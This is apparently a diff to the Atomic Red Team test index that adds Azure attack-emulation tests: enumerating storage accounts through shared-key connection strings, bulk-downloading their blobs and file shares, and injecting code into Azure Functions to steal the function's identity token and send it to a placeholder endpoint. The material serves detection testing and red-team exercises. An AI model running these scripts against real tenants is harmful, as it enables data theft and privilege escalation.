@@ -8371,6 +8371,83 @@ input_arguments.s3_bucket_name.type: string
 input_arguments.s3_bucket_name.default: redatomic-test2
 
 "
+T1530,Data from Cloud Storage Object,Azure - Dump Azure Storage Account Objects via Azure CLI,67374845-b4c8-4204-adcc-9b217b65d4f1,"This test dumps the content of the storage account objects present in the file defined in file_shares_csv_file_path. Note that this file is created in the atomic test T1619 ""Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI"". When created manually, it must contain the columns ""ResourceGroup"",""StorageAccountName"", ""FileShareName"", ""ContainerName"", ""BlobName"".
+
+Requirements:
+    - The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.
+    - The EntraID user must have the role ""Storage Account Contributor"", or a role with similar permissions.",iaas:azure,,,"$storage_account_objects = Import-Csv -Path ""#{storage_account_objects_csv_file_path}""
+
+# Login to Azure
+az login
+
+if (-not (Test-Path -Path ""#{output_folder}"")) {
+    New-Item -ItemType Directory -Path ""#{output_folder}""
+}
+
+foreach ($row in $storage_account_objects) {
+    
+    if ($row.FileShareName -ne """"){
+        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query ""allowSharedKeyAccess""
+
+        if ($allowSharedKeyAccess -eq ""false"") {    # $allowSharedKeyAccess could be true or null
+            Write-Output ""Shared key access is disabled for this storage account.""
+        } else {
+            Write-Output ""Fetching content from file share: $($row.FileShareName) in storage account $($row.StorageAccountName) ...""
+            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv
+            
+            # Create folder for storage account objects
+            $storageAccountOutputPath = Join-Path #{output_folder} ""$($row.ResourceGroup)_$($row.StorageAccountName)""
+            if (-not (Test-Path -Path $storageAccountOutputPath)) {
+                New-Item -ItemType Directory -Path $storageAccountOutputPath
+            }
+
+            # create folder for file share content
+            $fileSharePath = Join-Path -Path $storageAccountOutputPath $row.FileShareName
+            if (-not (Test-Path -Path $fileSharePath)) {
+                New-Item -ItemType Directory -Path $fileSharePath
+            }
+            az storage file download-batch --connection-string $connectionString --source $row.FileShareName --destination $fileSharePath
+        }
+    } elseif ($row.ContainerName -ne """" -and $row.BlobName -eq """") {
+        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query ""allowSharedKeyAccess""
+
+        if ($allowSharedKeyAccess -eq ""false"") {    # $allowSharedKeyAccess could be true or null
+            Write-Output ""Shared key access is disabled for this storage account.""
+        } else {
+            Write-Output ""Fetching all blobs from container $($row.ContainerName) in storage account $($row.StorageAccountName) ...""
+            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv
+            
+            # Create folder for storage account objects
+            $storageAccountOutputPath = Join-Path #{output_folder} ""$($row.ResourceGroup)_$($row.StorageAccountName)""
+            if (-not (Test-Path -Path $storageAccountOutputPath)) {
+                New-Item -ItemType Directory -Path $storageAccountOutputPath
+            }
+
+            # create folder for blob content
+            $containerFolderPath = Join-Path $storageAccountOutputPath $row.ContainerName
+            if (-not (Test-Path -Path $containerFolderPath)) {
+                New-Item -ItemType Directory -Path $containerFolderPath
+            }
+            az storage blob download-batch --destination $containerFolderPath --source $row.ContainerName --connection-string $connectionString
+        }
+    }
+}",powershell,False,,"Remove-Item -Path ""#{output_folder}"" -Recurse -Force -erroraction silentlycontinue
+Write-Output ""Removed #{output_folder}""",powershell,"dependencies.0.description: Azure CLI must be installed
+dependencies.0.prereq_command: try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+dependencies.0.get_prereq_command: Install-Module -Name Az -Force
+","input_arguments.output_folder.type: path
+
+input_arguments.output_folder.default: $env:temp\T1530_storage_account_objects
+
+input_arguments.output_folder.description: Folder path to output file share content to
+
+input_arguments.storage_account_objects_csv_file_path.type: path
+
+input_arguments.storage_account_objects_csv_file_path.default: $env:temp\T1619_storage_account_objects.csv
+
+input_arguments.storage_account_objects_csv_file_path.description: Path to file that contains all storage account objects in form of a csv file. This may be the result from Test T1619 ""Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI"".
+
+"
 T1547.014,Active Setup,HKLM - Add atomic_test key to launch executable as part of user setup,deff4586-0517-49c2-981d-bbea24d48d71,"This test will create an ""atomic_test"" key under 'HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components' to launch calc by configuring an active setup executable and 
 forcing to run active setup using the ""runonce.exe /AlternateShellStartup"" command. 
 Without the ""runonce.exe /AlternateShellStartup"" command it would run during the next logon for each user.
@@ -23884,6 +23961,132 @@ dependencies.0.prereq_command: cat ~/.aws/credentials | grep ""default""
 dependencies.0.get_prereq_command: echo Please install the aws-cli and configure your AWS default profile using: aws configure
 
 ",
+T1619,Cloud Storage Object Discovery,Azure - Enumerate Storage Account Objects via Shared Key authorization using Azure CLI,070322a4-2c60-4c50-8ffb-c450a34fe7bf,"This test enumerates all existing storage accounts and tries to fetch for each account the contained storage account objects. The access to storage objects is only possible if Shared Key authorization is enabled (e.g this is the case per default for storage objects creaded by Azure Function Apps).
+
+Requirements:
+- The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.
+- The EntraID user must have the role ""Storage Account Contributor"", or a role with similar permissions.
+
+Output format: Csv file that contains the found storage account objects
+- Columns: ResourceGroup, StorageAccountName, FileShareName, ContainerName, BlobName, TableName, QueueName
+- The content of these columns is filled out depending on the object. Not-required columns are left empt. Example: For a blob object the ResourceGroup, StorageAccountName, ContainerName, BlobName are filled out, the other fields are left empty.",iaas:azure,,,"az login    # Login to Azure
+
+# Get all storage accounts in the subscription
+$storageAccounts = az storage account list --query ""[].{name:name, resourceGroup:resourceGroup}"" --output json | ConvertFrom-Json
+
+$storageAccountObjects = @()
+$downloadedFunctionFiles = @()
+
+foreach ($account in $storageAccounts) {
+    Write-Output ""`nFound storage account $($account.name)""
+
+    $storageAccountObjects += [PSCustomObject]@{
+        ResourceGroup      = $account.resourceGroup
+        StorageAccountName = $account.name
+        FileShareName      = """"
+        ContainerName      = """"
+        BlobName           = """"
+        TableName          = """"
+        QueueName          = """"
+    }
+
+    $allowSharedKeyAccess = az storage account show --name $account.name --resource-group $account.resourceGroup --query ""allowSharedKeyAccess""
+    
+    if ($allowSharedKeyAccess -eq ""false"") {    # $allowSharedKeyAccess could be true or null
+        Write-Output ""Shared key access is disabled for this storage account.""
+    } else {
+        $connectionString = az storage account show-connection-string --name $account.name --resource-group $account.resourceGroup --query connectionString --output tsv
+        
+        $fileShares = az storage share list --connection-string $connectionString --query ""[].name"" --output json | ConvertFrom-Json
+        foreach($fileShare in $fileShares) {
+            Write-Output ""Found file share: $($fileShare)""
+            $storageAccountObjects += [PSCustomObject]@{
+                ResourceGroup      = $account.resourceGroup
+                StorageAccountName = $account.name
+                FileShareName      = $fileShare
+                ContainerName      = """"
+                BlobName           = """"
+                TableName          = """"
+                QueueName          = """"
+            }
+        }
+
+        $containers = az storage container list --connection-string $connectionString --query ""[].name"" --output json | ConvertFrom-Json
+        foreach($container in $containers) {
+            Write-Output ""Found container: $($container)""
+            $storageAccountObjects += [PSCustomObject]@{
+                ResourceGroup      = $account.resourceGroup
+                StorageAccountName = $account.name
+                FileShareName      = """"
+                ContainerName      = $container
+                BlobName           = """"
+                TableName          = """"
+                QueueName          = """"
+            }
+
+            $blobs = az storage blob list --connection-string $connectionString --container-name $container --query ""[].name"" --output json | ConvertFrom-Json
+
+            foreach($blob in $blobs) {
+                Write-Output ""Found blob: $($blob)""
+                $storageAccountObjects += [PSCustomObject]@{
+                    ResourceGroup      = $account.resourceGroup
+                    StorageAccountName = $account.name
+                    FileShareName      = """"
+                    ContainerName      = $container
+                    BlobName           = $blob
+                    TableName          = """"
+                    QueueName          = """"
+                }
+            }
+        }
+        
+        $tables = az storage table list --connection-string $connectionString --query ""[].name"" --output json | ConvertFrom-Json
+        foreach($table in $tables) {
+            Write-Output ""Found table: $($table)""
+            $storageAccountObjects += [PSCustomObject]@{
+                ResourceGroup      = $account.resourceGroup
+                StorageAccountName = $account.name
+                FileShareName      = """"
+                ContainerName      = """"
+                BlobName           = """"
+                TableName          = $table
+                QueueName          = """"
+            }
+        }
+        
+        $queues = az storage queue list --connection-string $connectionString --query ""[].name"" --output json | ConvertFrom-Json
+        foreach($queue in $queues) {
+            Write-Output ""Found table: $($table)""
+            $storageAccountObjects += [PSCustomObject]@{
+                ResourceGroup      = $account.resourceGroup
+                StorageAccountName = $account.name
+                FileShareName      = """"
+                ContainerName      = """"
+                BlobName           = """"
+                TableName          = """"
+                QueueName          = $queue
+            }
+        }
+    }
+}
+
+# Store file lists to csv file
+$storageAccountObjects | Export-Csv -Path ""#{output_file}"" -NoTypeInformation
+Write-Output ""`nDownloaded storage account objects to #{output_file}""
+
+# Print lists that have been stored as csv file
+$storageAccountObjects | Format-Table -Property ResourceGroup, StorageAccountName, FileShareName, ContainerName, BlobName, TableName, QueueName -AutoSize -Wrap
+",powershell,False,,"Remove-Item -Path ""#{output_file}"" -Force -erroraction silentlycontinue
+Write-Output ""Removed #{output_file}""",powershell,"dependencies.0.description: Azure CLI must be installed
+dependencies.0.prereq_command: try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+dependencies.0.get_prereq_command:  Install-Module -Name Az -Force
+","input_arguments.output_file.type: path
+
+input_arguments.output_file.default: $env:temp\T1619_storage_account_objects.csv
+
+input_arguments.output_file.description: Csv file path for results
+
+"
 T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery,f92a380f-ced9-491f-b338-95a991418ce2,"Methods to identify Security Software on an endpoint
 
 when sucessfully executed, the test is going to display running processes, firewall configuration on network profiles
@@ -26241,6 +26444,210 @@ input_arguments.input_file_passwords.description: Path to password list
 input_arguments.input_file_passwords.type: string
 
 input_arguments.input_file_passwords.default: PathToAtomicsFolder\T1110.002\src\password.lst
+
+"
+T1550.001,Use Alternate Authentication Material: Application Access Token,Azure - Functions code upload - Functions code injection via Blob upload,9a5352e4-56e5-45c2-9b3f-41a46d3b3a43,"This test injects code into an Azure Function (RCE).
+
+Attack idea/reference: https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/
+
+Similar to T1550.001 ""Azure - Functions code upload - Functions code injection to retrieve the Functions identity access token"", the depicted code injection scenario tampers the source code of Azure Functions to perform Subscription Privilege Escalation by retrieving the identity access token of an Azure functions instance. In this case, the prepared zip file (underlying package for a Function) is expected to contain the tampered function presented in src/code_to_insert.py. Note that the endpoint https://changeme.net needs to be adapted in your packed function code.
+
+Note:
+- The Azure Function modified in this test must be hosted via Azure Blob storage (Info on storage considerations for Azure Function: https://learn.microsoft.com/en-us/azure/azure-functions/storage-considerations). 
+- For Function code upload to Azure Functions that are hosted via Azure Files in a File Share, refer to T1550.001 ""Azure - Functions code upload - Functions code injection to retrieve the Functions identity access token"".
+- The required input fields can be retrieved in a reconnaissance step in test T1619 ""Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI"". The code of function apps may be inspected and prepared from the result of test T1530 ""Azure - Dump Azure Storage Account Objects via Azure CLI"".
+
+Requirements:
+- The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.
+- The EntraID user must have the role ""Storage Account Contributor"", or a role with similar permissions.",iaas:azure,,,"az login    # Log in to Azure CLI
+
+$allowSharedKeyAccess = az storage account show --name ""#{storage_account_name}"" --query ""allowSharedKeyAccess""
+
+if ($allowSharedKeyAccess -eq ""false"") {    # $allowSharedKeyAccess could be true or null
+    Write-Output ""Shared key access is disabled for this storage account.""
+} else {    
+    $connectionString = az storage account show-connection-string --name ""#{storage_account_name}"" --query connectionString --output tsv
+
+    # Download blob for cleanup
+    $tmpOriginalFunctionCode = Join-Path $env:temp/ (""T1550.001_tmp_original_"" + ""#{blob_name}"")
+    az storage blob download --connection-string $connectionString --container-name ""#{container_name}"" --name ""#{blob_name}"" --file $tmpOriginalFunctionCode --overwrite true
+
+    if ($LASTEXITCODE -eq 0) {
+        # Upload new blob version if download of existing blob succeeded
+        az storage blob upload --connection-string $connectionString --container-name ""#{container_name}"" --name ""#{blob_name}"" --file ""#{file_path_blob}"" --overwrite true
+    } else {
+        Write-Output ""Download original function code failed.""
+        exit 1
+    }
+}
+",powershell,False,,"az login    # Log in to Azure CLI
+
+# Upload previous funciton code
+$tmpOriginalFunctionCode = Join-Path $env:temp/ (""T1550.001_tmp_original_"" + ""#{blob_name}"")
+az storage blob upload --account-name ""#{storage_account_name}"" --container-name ""#{container_name}"" --file $tmpOriginalFunctionCode --name ""#{blob_name}"" --overwrite true 2>$null
+
+if ($LASTEXITCODE -eq 0) {
+    Write-Output ""Uploaded original version of function code.""
+
+    # Delete tmp original blob file if upload succeeded
+    Remove-Item -Path $tmpOriginalFunctionCode -Force -erroraction silentlycontinue
+    Write-Output ""Deleted tmp original blob file: $($tmpOriginalFunctionCode)""
+} else {
+    Write-Output ""Upload original function code failed.""
+}",powershell,"dependencies.0.description: Azure CLI must be installed
+dependencies.0.prereq_command: try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+dependencies.0.get_prereq_command: Install-Module -Name Az -Force
+","input_arguments.storage_account_name.type: string
+
+input_arguments.storage_account_name.default: storage_account_name_example
+
+input_arguments.storage_account_name.description: Name of storage account that is related to the Function
+
+input_arguments.container_name.type: string
+
+input_arguments.container_name.default: container_name_example
+
+input_arguments.container_name.description: Name of the container that contains the function blob
+
+input_arguments.blob_name.type: string
+
+input_arguments.blob_name.default: blob_example
+
+input_arguments.blob_name.description: Name of the function blob
+
+input_arguments.file_path_blob.type: path
+
+input_arguments.file_path_blob.default: $env:temp/T1550.001_function_code.zip
+
+input_arguments.file_path_blob.description: Path to the function code file to upload as blob
+
+"
+T1550.001,Use Alternate Authentication Material: Application Access Token,Azure - Functions code upload - Functions code injection via File Share modification to retrieve the Functions identity access token,67aaf4cb-54ce-42e2-ab56-e0a9bcc089b1,"This test injects code into an Azure Function (RCE) to perform Subscription Privilege Escalation by retrieving the identity access token of an Azure functions instance.
+
+Attack idea/reference: https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/
+
+Once executed, the ""https://changeme"" will retrieve the access token when the function app is executed on behalf of the tenant. The function may be triggered manually from authorized people, triggered in regular intervals, or in various other ways. The access token can then be used to perform further attack steps with the permissions that the function app holds (e.g. listening virtual machines).
+
+Note: 
+- The Azure Function modified in this test must be hosted via Azure Files in a File Share (Info on storage considerations for Azure Function: https://learn.microsoft.com/en-us/azure/azure-functions/storage-considerations).
+- For Function code upload to Azure Functions that are hosted via Azure Blob storage, refer to T1550.001 ""Azure - Functions code upload - Functions code injection via Blob upload"".
+- The required input fields can be retrieved in a reconnaissance step in test T1619 ""Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI"". The code of function apps may be inspected and prepared from the result of test T1530 ""Azure - Dump Azure Storage Account Objects via Azure CLI"".
+- Important: Change the https://changeme.net in code_to_insert_path to a self-controlled endpoint. This endpoint can be hosted e.g. as request bin via Pipedream to display the body of incoming POST requests.
+- The default injected code to retrieve the access token can be replaced by arbitrary other code. In this case: Replace the code defined in code_to_insert_path
+
+Requirements:
+- The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.
+- The EntraID user must have the role ""Storage Account Contributor"", or a role with similar permissions.
+
+Execution options: Defined by the input field execution_option
+- insert_code: This option (1) downloads the existing funciton code into a tmp file, (2) injects the code from code_to_insert_path at the beginning of the file, and (3) uploads the tampered file to the targeted Azure Function code (Azure File Share File).
+- replace_file: This option uploads the function code defined in code_to_insert_path to the targeted Azure Function code (Azure File Share File).",iaas:azure,,,"az login    # Log in to Azure CLI
+
+$allowSharedKeyAccess = az storage account show --name ""#{storage_account_name}"" --query ""allowSharedKeyAccess""
+
+if ($allowSharedKeyAccess -eq ""false"") {    # $allowSharedKeyAccess could be true or null
+    Write-Output ""Shared key access is disabled for this storage account.""
+} else {
+    # Download file for cleanup
+    $tmpOriginalFileName = [System.IO.Path]::GetFileName(""#{file_path}"")
+    $tmpOriginalFunctionCode = Join-Path $env:temp/ (""T1550.001_tmp_original_"" + $tmpOriginalFileName)
+    az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmpOriginalFunctionCode
+
+    if ($LASTEXITCODE -eq 0) {
+        # Upload new funciton code if download of existing code succeeded
+        if (""#{execution_option}"" -eq ""insert_code"") {
+            # Download file from file share for injection
+            $tmpFunctionCode = Join-Path $env:temp/ (""T1550.001_tmp_to_inject_"" + $tmpOriginalFileName)
+            az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmpFunctionCode
+            
+            if ($LASTEXITCODE -ne 0) {
+                Write-Output ""Function code download failed.""
+                exit 1
+            }
+            Write-Output ""File downloaded: $($tmpFunctionCode)""
+            
+            $insertContent = Get-Content -Path ""#{code_to_insert_path}"" -Raw  # Load the content of the insert file
+            
+            $content = Get-Content -Path $tmpFunctionCode -Raw  # Inject code to file
+            $content = $insertContent + ""`n"" + $content     # Insert the new code at the beginning
+            $content | Set-Content -Path $tmpFunctionCode       # Write the modified content to the file
+            
+            # Upload file to file share
+            az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source $tmpFunctionCode --only-show-errors
+            if ($LASTEXITCODE -ne 0) {
+                Write-Output ""Function code upload failed.""
+                exit 1
+            }
+            Write-Output ""Uploaded the tampered file""
+        } elseif (""#{execution_option}"" -eq ""replace_file"") {
+            az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source ""#{code_to_insert_path}"" --only-show-errors
+            if ($LASTEXITCODE -ne 0) {
+                Write-Output ""Function code upload failed.""
+                exit 1
+            }
+            Write-Output ""Uploaded the tampered file""
+        } else {
+            Write-Output ""Please choose a valid execution_option""
+            exit 1
+        }
+    } else {
+        Write-Output ""Download original function code failed.""
+        exit 1
+    }
+}",powershell,False,,"az login    # Log in to Azure CLI
+
+# Upload previous funciton code
+$tmpOriginalFileName = [System.IO.Path]::GetFileName(""#{file_path}"")
+$tmpOriginalFunctionCode = Join-Path $env:temp/ (""T1550.001_tmp_original_"" + $tmpOriginalFileName)
+az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source $tmpOriginalFunctionCode --only-show-errors 2>$null
+
+if ($LASTEXITCODE -eq 0) {
+    Write-Output ""Uploaded original version of function code.""
+
+    # Delete tmp original f file if upload succeeded
+    if (""#{execution_option}"" -eq ""insert_code"") {
+        $tmpFunctionCode = Join-Path $env:temp/ (""T1550.001_tmp_to_inject_"" + $tmpOriginalFileName)
+        Remove-Item -Path $tmpFunctionCode -Force -erroraction silentlycontinue
+        Write-Output ""Deleted tmp file: $($tmpFunctionCode)""
+    }
+
+    # Delete tmp original file
+    Remove-Item -Path $tmpOriginalFunctionCode -Force -erroraction silentlycontinue
+    Write-Output ""Deleted tmp original file: $($tmpOriginalFunctionCode)""
+} else {
+    Write-Output ""Upload original function code failed.""
+}",powershell,"dependencies.0.description: Azure CLI must be installed
+dependencies.0.prereq_command: try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+dependencies.0.get_prereq_command: Install-Module -Name Az -Force
+","input_arguments.storage_account_name.type: string
+
+input_arguments.storage_account_name.default: storage_account_name_example
+
+input_arguments.storage_account_name.description: Name of storage account that is related to the Function
+
+input_arguments.execution_option.type: string
+
+input_arguments.execution_option.default: insert_code
+
+input_arguments.execution_option.description: Chooses execution option insert_code, or replace_file
+
+input_arguments.file_share_name.type: string
+
+input_arguments.file_share_name.default: file_share_name_example
+
+input_arguments.file_share_name.description: Name of the file share that is related to the Function
+
+input_arguments.file_path.type: path
+
+input_arguments.file_path.default: site/wwwroot/function_app.py
+
+input_arguments.file_path.description: Path to the Function file in the file share
+
+input_arguments.code_to_insert_path.type: path
+
+input_arguments.code_to_insert_path.default: $PathToAtomicsFolder/T1550.001/src/code_to_insert.py
+
+input_arguments.code_to_insert_path.description: The code that will be injected into the Function
 
 "
 T1539,Steal Web Session Cookie,Steal Firefox Cookies (Windows),4b437357-f4e9-4c84-9fa6-9bcee6f826aa,"This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. 
